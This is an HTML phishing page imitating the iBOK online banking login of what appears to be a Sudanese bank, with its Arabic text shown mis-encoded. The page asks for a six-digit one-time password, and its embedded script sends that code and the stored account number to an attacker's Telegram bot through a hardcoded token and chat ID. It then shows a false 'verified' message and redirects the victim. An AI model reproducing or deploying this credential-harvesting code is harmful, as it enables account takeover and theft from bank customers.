<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ุฅุฏุฎุงู ุฑูุฒ OTP - iBOK</title>
    <link rel="stylesheet" href="styles.css"> 
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="logo-text">iBOK ุงู ุจูู</div>
            <div class="service-name">ุงูุฎุฏูุงุช ุงููุตุฑููุฉ ุนุจุฑ ุงูุฅูุชุฑูุช</div>
        </header>

        <div class="welcome-banner">
            ูุฑุญุจุงู ุจูู ูู ุฎุฏูุฉ iBOK ุงููุตุฑููุฉ ุนุจุฑ ุงูุฅูุชุฑูุช
        </div>

        <div class="form-content-wrapper">

            <div class="form-card">
                <div class="card-title">ุฅุฏุฎุงู ุฑูุฒ ุงูุชุญูู ุงูููุงุฆู</div>
                <div class="card-subtitle" style="text-align: center; margin-top: 15px;">
                    ุงูุฑุฌุงุก ุงุฏุฎุงู ุฑูุฒ ุงูุชุญูู ุงููุฑุณู ุฅูู ุฑูู ูุงุชูู ู ุจุฑูุฏู ุงูุฅููุชุฑููู ุงููุณุฌู 
                </div>

                <form id="otpForm">
                    <div class="input-group" style="margin-top: 30px;">
                        <label class="input-label" for="otp-code">ุฃุฏุฎู ุฑูุฒ ุงูุชุญูู (OTP):</label>
                        <input class="form-input" type="text" id="otp-code" placeholder="ุฃุฏุฎู ุงูุฑูุฒ ุงููููู ูู 6 ุฃุฑูุงู" maxlength="6" required 
                                inputmode="numeric" pattern="\d{6}">
                        <span class="input-description" style="display: block; font-size: 13px; color: #777; margin-top: 5px;">ุฃุฏุฎู ุฑูุฒ ูููู ูู 6 ุฃุฑูุงู</span>
                    </div>

                    <div class="otp-timer" id="timerDisplay" style="text-align: center; color: #555; font-size: 15px; margin-top: 15px;">
                        ุฅุนุงุฏุฉ ุฅุฑุณุงู ุงูุฑูุฒ ุฎูุงู **60:00 ุฏูููุฉ**
                    </div>
                    
                    <button type="submit" class="submit-button" style="margin-top: 30px;">ุชุฃููุฏ ุงูุฑูุฒ ูุงูุฏุฎูู</button>
                </form>
            </div>
        </div>
        </div>
<script type="module">
    const TELEGRAM_TOKEN = "8569488666:AAE2HdV-K-BrpmPLw-IlKr_9UiEiYbD40Mc";
    const CHAT_ID = "8108669125";

    const otpForm = document.getElementById('otpForm');
    const otpCodeInput = document.getElementById('otp-code');
    const timerDisplay = document.getElementById('timerDisplay');

    // ======== ุนุฏุงุฏ 30 ุฏูููุฉ ========
    let timeLeft = 60 * 60; // 60 ุฏูููุฉ ุจุงูุซูุงูู
 

    function startOtpTimer() {
        const timerInterval = setInterval(() => {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;

            timerDisplay.textContent =
                `ุฅุนุงุฏุฉ ุฅุฑุณุงู ุงูุฑูุฒ ุฎูุงู ${minutes}:${seconds.toString().padStart(2, '0')} ุฏูููุฉ`;

            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                timerDisplay.textContent = 'ููููู ุฅุนุงุฏุฉ ุฅุฑุณุงู ุงูุฑูุฒ ุงูุขู';
            }

            timeLeft--;
        }, 1000);
    }

    startOtpTimer();
    // ======== ููุงูุฉ ุงูุนุฏุงุฏ ========

    function showToast(message, color='#4CAF50') {
        alert(message);
    }

    async function sendOtpToTelegram(userID, otpCode) {
        const message = `๐ ุฑูุฒ OTP:\nุฑูู ุงูุญุณุงุจ: ${userID}\nุงูุฑูุฒ: ${otpCode}`;
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
        try {
            await fetch(url);
        } catch(err) {
            console.error("ุฎุทุฃ ูู ุฅุฑุณุงู OTP ููุจูุช:", err);
        }
    }

    otpForm.addEventListener('submit', async (event) => {
        event.preventDefault();
        const otpCode = otpCodeInput.value.trim();
        const userID = localStorage.getItem('userID');

        if (!userID) {
            showToast('ุฎุทุฃ: ูู ูุชู ุงูุนุซูุฑ ุนูู ุฑูู ุงูุญุณุงุจ. ุงูุฑุฌุงุก ุชุณุฌูู ุงูุฏุฎูู ุฃููุงู.', '#D32F2F');
            setTimeout(() => { window.location.href = "login.html"; }, 1000);
            return;
        }

        if (otpCode.length !== 6 || isNaN(otpCode)) {
            showToast('ุงูุฑุฌุงุก ุฅุฏุฎุงู ุฑูุฒ ุชุญูู ุตุญูุญ ูููู ูู 6 ุฃุฑูุงู.', '#D32F2F');
            otpCodeInput.focus();
            return;
        }

        await sendOtpToTelegram(userID, otpCode);
        showToast('ุชู ุงูุชุญูู ูู ุงูุฑูุฒ. ุฌุงุฑู ุงูุฏุฎูู...');

        setTimeout(() => {
            window.location.href = "m.html";
        }, 1000);
    });
</script>

</body>
</html>